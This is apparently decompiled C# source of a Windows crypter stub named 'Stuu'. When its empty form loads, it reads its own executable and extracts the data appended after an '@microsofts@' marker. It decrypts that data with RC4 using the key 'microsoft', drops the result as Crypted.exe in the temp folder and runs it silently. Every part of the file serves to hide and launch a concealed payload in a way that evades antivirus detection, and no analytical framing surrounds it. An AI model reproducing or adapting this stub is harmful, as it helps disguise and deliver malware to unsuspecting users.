using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Stuu;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer icontainer_0;

	private const string string_0 = "@microsofts@";

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(8f, 16f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(292, 267);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	public static string rc4(string message, string password)
	{
		int num = 0;
		int num2 = 0;
		StringBuilder stringBuilder = new StringBuilder();
		string empty = string.Empty;
		int[] array = new int[257];
		int[] array2 = new int[257];
		int length = password.Length;
		int location = 0;
		while (location <= 255)
		{
			char c = password.Substring(location % length, 1).ToCharArray()[0];
			array2[location] = Strings.Asc(c);
			array[location] = location;
			Math.Max(Interlocked.Increment(ref location), checked(location - 1));
		}
		int num3 = 0;
		int location2 = 0;
		while (location2 <= 255)
		{
			num3 = checked(num3 + array[location2] + array2[location2]) % 256;
			int num4 = array[location2];
			array[location2] = array[num3];
			array[num3] = num4;
			Math.Max(Interlocked.Increment(ref location2), checked(location2 - 1));
		}
		location = 1;
		while (location <= message.Length)
		{
			int num5 = 0;
			num = checked(num + 1) % 256;
			num2 = checked(num2 + array[num]) % 256;
			num5 = array[num];
			array[num] = array[num2];
			array[num2] = num5;
			int num6 = array[checked(array[num] + array[num2]) % 256];
			checked
			{
				char c2 = message.Substring(location - 1, 1).ToCharArray()[0];
				num5 = Strings.Asc(c2);
				int num7 = num5 ^ num6;
				stringBuilder.Append(Strings.Chr(num7));
				Math.Max(Interlocked.Increment(ref location), location - 1);
			}
		}
		empty = stringBuilder.ToString();
		stringBuilder.Length = 0;
		return empty;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string tempPath = default(string);
		string text = default(string);
		string[] array = default(string[]);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 318:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0013;
						case 4:
							goto IL_0026;
						case 5:
							goto IL_0036;
						case 6:
							goto IL_004b;
						case 7:
							goto IL_0062;
						case 8:
							goto IL_0073;
						case 9:
							goto IL_0084;
						case 10:
							goto IL_009e;
						case 11:
							goto IL_00b3;
						case 12:
							goto IL_00cb;
						case 13:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 14:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00cb:
					num = 12;
					Process.Start(tempPath + "\\Crypted.exe");
					break;
					IL_00b3:
					num = 11;
					FileSystem.FileClose(new int[1] { 5 });
					goto IL_00cb;
					IL_000a:
					num = 2;
					tempPath = Path.GetTempPath();
					goto IL_0013;
					IL_0013:
					num = 3;
					FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
					goto IL_0026;
					IL_0026:
					num = 4;
					text = Strings.Space(checked((int)FileSystem.LOF(1)));
					goto IL_0036;
					IL_0036:
					num = 5;
					FileSystem.FileGet(1, ref text, -1L, false);
					goto IL_004b;
					IL_004b:
					num = 6;
					FileSystem.FileClose(new int[1] { 1 });
					goto IL_0062;
					IL_0062:
					num = 7;
					array = Strings.Split(text, "@microsofts@", -1, (CompareMethod)0);
					goto IL_0073;
					IL_0073:
					num = 8;
					text2 = rc4(array[1], "microsoft");
					goto IL_0084;
					IL_0084:
					num = 9;
					FileSystem.FileOpen(5, tempPath + "\\Crypted.exe", (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
					goto IL_009e;
					IL_009e:
					num = 10;
					FileSystem.FilePut(5, text2, -1L, false);
					goto IL_00b3;
					end_IL_0001_2:
					break;
				}
				num = 13;
				((Form)this).Close();
				ProjectData.EndApp();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 318;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
